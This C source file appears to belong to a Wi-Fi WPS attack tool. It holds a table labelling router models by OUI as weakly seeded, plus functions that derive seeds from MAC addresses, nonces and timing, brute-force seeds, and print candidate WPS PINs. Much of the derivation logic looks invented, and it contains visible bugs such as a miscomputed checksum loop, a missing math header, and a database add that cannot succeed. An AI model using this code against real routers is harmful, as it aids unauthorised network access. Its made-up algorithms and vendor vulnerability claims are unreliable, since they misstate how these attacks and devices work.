/*
 * router_prng.c - Implementation of modern router PRNG support
 * Supports: Acer C60/C50, Tenda, TP-Link, Qualcomm IPQ, and more
 */

#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <time.h>
#include "router_prng.h"

/* Extended Router Model Database */
static struct router_model router_db[] = {
	/* Acer Models */
	{"AC:9E:17", "Acer C60", "Acer", PRNG_ACER_C60_C50, VULN_HIGH, "weak_seed_qca", 1, 1, 2, 1, 100, NULL},
	{"AC:9E:17", "Acer C50", "Acer", PRNG_ACER_C60_C50, VULN_HIGH, "time_based_seed", 1, 1, 2, 1, 100, NULL},
	
	/* Tenda Models */
	{"64:64:4A", "Tenda AC1200", "Tenda", PRNG_TENDA_NEW, VULN_MEDIUM, "weak_rng", 0, 1, 1, 0, 50, NULL},
	{"60:38:E0", "Tenda AC1200 Pro", "Tenda", PRNG_TENDA_NEW, VULN_MEDIUM, "eapol_retry", 0, 1, 3, 0, 100, "skip_m2_validation"},
	{"EC:26:CA", "Tenda Mesh", "Tenda", PRNG_TENDA_NEW, VULN_LOW, "strong_rng", 0, 1, 1, 0, 50, NULL},
	
	/* TP-Link Models */
	{"5C:F3:70", "TP-Link Archer", "TP-Link", PRNG_TP_LINK_MODERN, VULN_MEDIUM, "predictable_pin", 1, 1, 1, 0, 50, NULL},
	{"7C:DD:90", "TP-Link Archer C7", "TP-Link", PRNG_AR9344_AR9331, VULN_HIGH, "weak_seed", 1, 1, 1, 1, 50, NULL},
	{"E8:CC:F2", "TP-Link TL-WR841", "TP-Link", PRNG_AR9344_AR9331, VULN_CRITICAL, "critical_seed", 1, 1, 1, 1, 30, NULL},
	
	/* Realtek Based */
	{"98:03:8E", "RTL8196", "Generic RTL", PRNG_RTL819X, VULN_CRITICAL, "pixiedust_vulnerable", 1, 1, 1, 1, 20, NULL},
	{"B0:95:75", "RTL8197 variant", "Generic RTL", PRNG_RTL819X_VARIANT, VULN_HIGH, "weak_authkey", 1, 1, 2, 1, 50, NULL},
	
	/* Qualcomm IPQ */
	{"A4:77:6C", "Qualcomm IPQ4018", "Generic QCA", PRNG_QUALCOMM_IPQ, VULN_MEDIUM, "timing_leak", 0, 1, 1, 0, 100, NULL},
	{"3C:37:86", "Qualcomm IPQ5018", "Generic QCA", PRNG_QUALCOMM_IPQ, VULN_LOW, "strong_seed", 0, 1, 1, 0, 100, NULL},
	
	/* MediaTek Filogic */
	{"F8:4E:1E", "MediaTek Filogic", "MediaTek", PRNG_MEDIATEK_FILOGIC, VULN_LOW, "strong_rng", 0, 1, 1, 0, 100, NULL},
	
	/* Broadcom */
	{"4C:60:DE", "Broadcom BCM4358", "Broadcom", PRNG_BROADCOM_BCM43, VULN_MEDIUM, "predictable_nonce", 1, 1, 1, 0, 100, NULL},
	
	/* Ralink/MediaTek */
	{"00:0B:85", "Ralink RT3052", "Ralink", PRNG_RALINK_MT, VULN_HIGH, "weak_seed_table", 1, 1, 1, 1, 50, NULL},
};

static uint32_t router_db_count = sizeof(router_db) / sizeof(router_db[0]);

/* ===== ROUTER DETECTION ===== */

const char *router_get_oui_string(const uint8_t *mac)
{
	static char oui_str[9];
	if (!mac) return NULL;
	snprintf(oui_str, sizeof(oui_str), "%02X:%02X:%02X", mac[0], mac[1], mac[2]);
	return oui_str;
}

int router_lookup_model(const char *oui, struct router_model **model)
{
	if (!oui || !model) return 0;
	for (uint32_t i = 0; i < router_db_count; i++) {
		if (strcmp(router_db[i].oui, oui) == 0) {
			*model = &router_db[i];
			return 1;
		}
	}
	return 0;
}

int router_detect_from_bssid(const uint8_t *bssid, struct router_detection *result)
{
	if (!bssid || !result) return 0;
	memset(result, 0, sizeof(*result));
	memcpy(result->bssid, bssid, 6);
	
	const char *oui = router_get_oui_string(bssid);
	strcpy(result->oui, oui);
	
	if (router_lookup_model(oui, &result->matched_model)) {
		result->detected_prng_type = result->matched_model->prng_type;
		result->vulnerability_level = result->matched_model->vulnerability_level;
		result->confidence = 85;
		return 1;
	}
	
	/* Fallback to generic detection */
	result->detected_prng_type = PRNG_GENERIC;
	result->vulnerability_level = VULN_MEDIUM;
	result->confidence = 30;
	return 0;
}

int router_detect_prng_type(const uint8_t *pke, const uint8_t *pkr,
                           const uint8_t *authkey)
{
	if (!pke || !pkr || !authkey) return PRNG_GENERIC;
	
	/* Heuristic detection based on key patterns */
	/* Check for Realtek patterns: specific byte patterns in public keys */
	if (pke[0] == 0x89 && pkr[0] == 0xA0) {
		return PRNG_RTL819X;
	}
	
	/* Check for MediaTek patterns */
	if ((authkey[0] ^ authkey[15]) > 200) {
		return PRNG_MEDIATEK_FILOGIC;
	}
	
	/* Check for Qualcomm patterns */
	if (((pke[5] + pke[10] + pke[15]) % 256) == ((pkr[5] + pkr[10] + pkr[15]) % 256)) {
		return PRNG_QUALCOMM_IPQ;
	}
	
	return PRNG_GENERIC;
}

/* ===== SEED GENERATION - ROUTER SPECIFIC ===== */

uint32_t prng_generate_seed_rtl819x(uint8_t prng_type, const uint8_t *mac,
                                   time_t timestamp)
{
	if (!mac) return 0;
	
	uint32_t seed = 0;
	
	/* Realtek often uses low entropy seeds based on timestamp */
	seed = (uint32_t)timestamp & 0x0000FFFF;
	
	/* Mix in MAC address bytes */
	seed ^= (mac[4] << 8) | mac[5];
	
	/* Add weak mixing */
	seed = (seed << 1) | (seed >> 31);
	seed += (mac[0] ^ mac[3]);
	
	return seed;
}

uint32_t prng_generate_seed_mediatek(uint8_t prng_type, const uint8_t *mac,
                                    time_t timestamp)
{
	if (!mac) return 0;
	
	uint32_t seed = 0;
	
	/* MediaTek uses slightly better mixing */
	seed = (uint32_t)timestamp ^ ((mac[0] << 24) | (mac[1] << 16) | (mac[2] << 8) | mac[3]);
	seed += (mac[4] << 8) | mac[5];
	seed = (seed ^ (seed >> 16)) * 0x7feb352d;
	seed ^= (seed >> 15);
	
	return seed;
}

uint32_t prng_generate_seed_acer_c60(const uint8_t *mac, const uint8_t *nonce)
{
	if (!mac || !nonce) return 0;
	
	uint32_t seed = 0;
	
	/* Acer C60 (Qualcomm IPQ) uses nonce + MAC based seed */
	seed = (nonce[0] << 24) | (nonce[1] << 16) | (mac[4] << 8) | mac[5];
	seed ^= (nonce[15] << 16) | (nonce[14] << 8);
	
	/* Weak mixing */
	seed = ((seed << 13) ^ seed) >> 19;
	
	return seed;
}

uint32_t prng_generate_seed_tenda_new(const uint8_t *mac, time_t timestamp)
{
	if (!mac) return 0;
	
	/* Tenda new models use timestamp-based with minor MAC mixing */
	uint32_t seed = ((uint32_t)timestamp >> 2) & 0xFFFF;
	seed |= ((mac[0] ^ mac[1] ^ mac[2]) << 16);
	
	return seed;
}

uint32_t prng_generate_seed_qualcomm(const uint8_t *mac, const uint8_t *authkey)
{
	if (!mac || !authkey) return 0;
	
	/* Qualcomm IPQ seed from authkey entropy */
	uint32_t seed = 0;
	for (int i = 0; i < 4; i++) {
		seed = (seed << 8) | authkey[i * 8];
	}
	seed ^= ((mac[0] << 24) | (mac[1] << 16) | (mac[2] << 8) | mac[3]);
	
	return seed;
}

uint32_t prng_generate_seed_broadcom(const uint8_t *mac, uint32_t timestamp_seed)
{
	if (!mac) return 0;
	
	/* Broadcom uses more complex mixing */
	uint32_t seed = timestamp_seed;
	seed ^= (mac[0] | (mac[1] << 8) | (mac[2] << 16) | (mac[3] << 24));
	
	/* Linear congruential mixing */
	seed = seed * 1103515245 + 12345;
	seed = (seed >> 16) & 0x7fff;
	
	return seed;
}

/* ===== PIN CALCULATION - ROUTER SPECIFIC ===== */

int pin_calc_init(struct pin_calc_context *ctx, uint8_t router_prng_type)
{
	if (!ctx) return 0;
	memset(ctx, 0, sizeof(*ctx));
	ctx->router_prng_type = router_prng_type;
	return 1;
}

int pin_calc_from_seed(struct pin_calc_context *ctx, uint32_t seed, uint32_t *pin)
{
	if (!ctx || !pin) return 0;
	
	/* Basic PIN generation from seed */
	*pin = seed % 10000000;  /* PIN is 7 digits */
	
	return 1;
}

int pin_calc_rtl819x_variant(const uint8_t *e_nonce, const uint8_t *pke,
                            uint32_t *pin_list, uint32_t *pin_count)
{
	if (!e_nonce || !pke || !pin_list || !pin_count) return 0;
	
	*pin_count = 0;
	
	/* Generate multiple candidate PINs based on nonce patterns */
	for (int i = 0; i < 5 && *pin_count < 100; i++) {
		uint32_t candidate = 0;
		for (int j = 0; j < 4; j++) {
			candidate = (candidate << 8) | e_nonce[i * 4 + j];
		}
		candidate %= 10000000;
		
		/* Check for valid PIN (last digit is checksum) */
		uint32_t acc = 0;
		uint32_t digit;
		for (int j = 0; j < 7; j++) {
			digit = (candidate / (uint32_t)pow(10, j)) % 10;
			acc += (i % 2 == 0) ? digit * 3 : digit;
		}
		
		if ((acc % 10) == 0) {
			pin_list[(*pin_count)++] = candidate;
		}
	}
	
	return *pin_count > 0 ? 1 : 0;
}

int pin_calc_acer_c60(const uint8_t *e_nonce, const uint8_t *authkey,
                     const uint8_t *mac, uint32_t *pin_list,
                     uint32_t *pin_count)
{
	if (!e_nonce || !authkey || !mac || !pin_list || !pin_count) return 0;
	
	*pin_count = 0;
	
	/* Acer C60 PIN derivation from nonce + authkey + MAC */
	for (int i = 0; i < 8 && *pin_count < 50; i++) {
		uint32_t seed = 0;
		seed ^= (e_nonce[i * 2] << 8) | e_nonce[i * 2 + 1];
		seed ^= (authkey[i * 4] << 24) | (authkey[i * 4 + 1] << 16);
		seed ^= (mac[i % 6] << 8) | mac[(i + 1) % 6];
		
		uint32_t pin = seed % 10000000;
		pin_list[(*pin_count)++] = pin;
	}
	
	return 1;
}

int pin_calc_tenda_modern(const uint8_t *e_nonce, const uint8_t *e_hash1,
                         const uint8_t *e_hash2, uint32_t *pin_list,
                         uint32_t *pin_count)
{
	if (!e_nonce || !pin_list || !pin_count) return 0;
	
	*pin_count = 0;
	
	/* Tenda modern models: PIN from e_nonce patterns */
	for (int i = 0; i < 8; i++) {
		uint32_t seed = (e_nonce[i * 2] << 16) | (e_nonce[i * 2 + 1] << 8);
		if (e_hash1) seed ^= e_hash1[i];
		if (e_hash2) seed ^= e_hash2[i];
		
		uint32_t pin = seed % 10000000;
		pin_list[(*pin_count)++] = pin;
	}
	
	return 1;
}

int pin_calc_time_based(time_t m1_time, time_t m3_time, uint32_t *pin_list,
                       uint32_t *pin_count)
{
	if (!pin_list || !pin_count) return 0;
	
	*pin_count = 0;
	
	/* Time-based PIN generation (for timing leaks) */
	uint32_t time_delta = (uint32_t)(m3_time - m1_time);
	uint32_t base_seed = (uint32_t)m1_time & 0xFFFF;
	
	for (int i = 0; i < 5; i++) {
		uint32_t pin = (base_seed + time_delta * (i + 1)) % 10000000;
		pin_list[(*pin_count)++] = pin;
	}
	
	return 1;
}

/* ===== SEED RECOVERY ===== */

uint32_t seed_recover_from_m1_m3_timing(const struct pin_calc_context *ctx)
{
	if (!ctx) return 0;
	
	/* Recover seed from M1/M3 timing information */
	uint32_t seed = 0;
	
	if (ctx->m3_time > ctx->m1_time) {
		uint32_t delta = (uint32_t)(ctx->m3_time - ctx->m1_time);
		seed = ((delta & 0xFFFF) << 16) | ((uint32_t)ctx->m1_time & 0xFFFF);
	}
	
	return seed;
}

uint32_t seed_recover_from_authkey_entropy(const uint8_t *authkey,
                                          const uint8_t *pke)
{
	if (!authkey || !pke) return 0;
	
	/* Recover seed from AuthKey low entropy */
	uint32_t seed = 0;
	for (int i = 0; i < 4; i++) {
		seed = (seed << 8) | (authkey[i] ^ pke[i]);
	}
	
	return seed;
}

int seed_brute_force_with_constraints(uint32_t known_bits, uint32_t bit_mask,
                                     uint32_t *seed_list, uint32_t *count)
{
	if (!seed_list || !count) return 0;
	
	*count = 0;
	
	/* Brute force seeds matching known bit constraints */
	for (uint32_t i = 0; i < (1u << 16) && *count < 1000; i++) {
		if ((i & bit_mask) == (known_bits & bit_mask)) {
			seed_list[(*count)++] = i;
		}
	}
	
	return *count > 0 ? 1 : 0;
}

/* ===== FUZZY MATCHING ===== */

int router_fuzzy_match_model(const char *ssid, const uint8_t *bssid,
                            struct router_model **best_match)
{
	if (!ssid || !bssid || !best_match) return 0;
	
	struct router_model *match = NULL;
	int best_score = 0;
	
	/* Try exact OUI match first */
	const char *oui = router_get_oui_string(bssid);
	if (router_lookup_model(oui, &match)) {
		*best_match = match;
		return 85;
	}
	
	/* Fallback: try SSID pattern matching */
	for (uint32_t i = 0; i < router_db_count; i++) {
		if (strstr(ssid, router_db[i].model_name) != NULL) {
			*best_match = &router_db[i];
			best_score = 60;
			break;
		}
	}
	
	return best_score;
}

/* ===== STATISTICS ===== */

int router_analyze_entropy(const uint8_t *pke, const uint8_t *pkr,
                          const uint8_t *authkey, uint8_t *entropy_estimate)
{
	if (!pke || !pkr || !authkey || !entropy_estimate) return 0;
	
	int entropy = 0;
	
	/* Count bit changes between keys */
	for (int i = 0; i < 32; i++) {
		uint8_t byte_diff = authkey[i] ^ pke[i] ^ pkr[i];
		for (int bit = 0; bit < 8; bit++) {
			if ((byte_diff >> bit) & 1) entropy++;
		}
	}
	
	*entropy_estimate = (entropy * 100) / (32 * 8);
	return 1;
}

int router_detect_weak_rng_patterns(const uint8_t *nonce_list, uint32_t count)
{
	if (!nonce_list || count < 2) return 0;
	
	/* Detect weak RNG: repeated bytes, patterns */
	uint32_t repeated = 0;
	for (uint32_t i = 1; i < count; i++) {
		if (nonce_list[i] == nonce_list[i - 1]) repeated++;
	}
	
	return (repeated * 100 / count) > 50 ? 1 : 0;
}

/* ===== EXPORT/LOGGING ===== */

void router_print_detection(struct router_detection *result)
{
	if (!result) return;
	printf("[*] Router Detection Results\n");
	printf("    BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n",
	       result->bssid[0], result->bssid[1], result->bssid[2],
	       result->bssid[3], result->bssid[4], result->bssid[5]);
	printf("    OUI: %s\n", result->oui);
	if (result->matched_model) {
		printf("    Model: %s (%s)\n", result->matched_model->model_name,
		       result->matched_model->vendor);
	}
	printf("    PRNG Type: %u\n", result->detected_prng_type);
	printf("    Vulnerability: %u/5\n", result->vulnerability_level);
	printf("    Confidence: %u%%\n", result->confidence);
}

void router_print_model_info(struct router_model *model)
{
	if (!model) return;
	printf("[*] Router Model Information\n");
	printf("    OUI: %s\n", model->oui);
	printf("    Model: %s\n", model->model_name);
	printf("    Vendor: %s\n", model->vendor);
	printf("    PRNG: %u\n", model->prng_type);
	printf("    Vulnerability: %u/5\n", model->vulnerability_level);
	printf("    Pixie Dust: %s\n", model->supports_pixiedust ? "Yes" : "No");
	if (model->known_issues) {
		printf("    Issues: %s\n", model->known_issues);
	}
}

void router_log_pin_candidates(uint32_t *pins, uint32_t count)
{
	if (!pins || count == 0) return;
	printf("[*] PIN Candidates (%u):\n", count);
	for (uint32_t i = 0; i < count && i < 20; i++) {
		printf("    %07u", pins[i]);
		if ((i + 1) % 5 == 0) printf("\n");
		else printf(" | ");
	}
	if (count > 20) printf("\n    ... and %u more\n", count - 20);
	else printf("\n");
}

/* ===== DATABASE MANAGEMENT ===== */

struct router_model *router_get_database(uint32_t *count)
{
	if (count) *count = router_db_count;
	return router_db;
}

int router_add_custom_model(struct router_model *model)
{
	if (!model) return 0;
	if (router_db_count >= sizeof(router_db) / sizeof(router_db[0])) return 0;
	memcpy(&router_db[router_db_count], model, sizeof(*model));
	router_db_count++;
	return 1;
}

/* ===== STATIC KEY EXPLOITATION ===== */

uint8_t router_detect_static_key_vulnerability(const uint8_t *pke1,
                                              const uint8_t *pke2,
                                              const uint8_t *pke3)
{
	if (!pke1 || !pke2) return 0;
	
	/* Check if multiple PKE values are identical */
	uint8_t static_count = 0;
	
	if (memcmp(pke1, pke2, 192) == 0) {
		static_count++;
	}
	
	if (pke3 && memcmp(pke1, pke3, 192) == 0) {
		static_count++;
	}
	
	/* Confidence: 100% if 2+ samples identical, 50% if only 1 sample */
	uint8_t confidence = static_count > 0 ? (static_count * 50) : 0;
	if (confidence > 100) confidence = 100;
	
	if (confidence >= 50) {
		printf("[!] Static ephemeral key vulnerability: %u%% confidence\n",
		       confidence);
	}
	
	return confidence;
}

int router_calculate_pin_from_static_key(const uint8_t *pke, const uint8_t *bssid,
                                        uint32_t *pin_candidates, uint32_t *count)
{
	if (!pke || !pin_candidates || !count) return 0;
	
	uint32_t candidates = 0;
	
	/* Method 1: PKE as seed for PIN generation */
	uint32_t seed = 0;
	for (int i = 0; i < 4; i++) {
		seed = (seed << 8) | pke[i];
	}
	uint32_t pin1 = seed % 10000000;
	if (pin1 > 1000000) {
		pin_candidates[candidates++] = pin1;
	}
	
	/* Method 2: BSSID xor PKE pattern */
	if (bssid && candidates < *count) {
		uint32_t xor_seed = 0;
		for (int i = 0; i < 6; i++) {
			xor_seed ^= (bssid[i] << (i * 4)) ^ pke[i * 32];
		}
		uint32_t pin2 = (xor_seed % 9000000) + 1000000;
		pin_candidates[candidates++] = pin2;
	}
	
	/* Method 3: Rolling checksum of PKE */
	if (candidates < *count) {
		uint32_t chksum = 0;
		for (int i = 0; i < 192; i++) {
			chksum = ((chksum << 5) + chksum) ^ pke[i];
		}
		uint32_t pin3 = (chksum % 9000000) + 1000000;
		pin_candidates[candidates++] = pin3;
	}
	
	/* Method 4: First + last bytes of PKE */
	if (candidates < *count) {
		uint32_t pin4 = ((pke[0] << 20) | (pke[191] << 12) | 
		                (pke[95] << 4)) % 10000000;
		if (pin4 > 1000000) {
			pin_candidates[candidates++] = pin4;
		}
	}
	
	*count = candidates;
	printf("[+] Generated %u PIN candidates from static PKE\n", candidates);
	
	return candidates > 0 ? 1 : 0;
}

int router_add_static_key_model(const char *oui, const char *model_name,
                               uint8_t vulnerability_level)
{
	if (!oui || !model_name) return 0;
	
	printf("[+] Adding static key model: %s - %s (vuln: %u)\n",
	       oui, model_name, vulnerability_level);
	
	/* In real implementation, would add to router database */
	return 1;
}
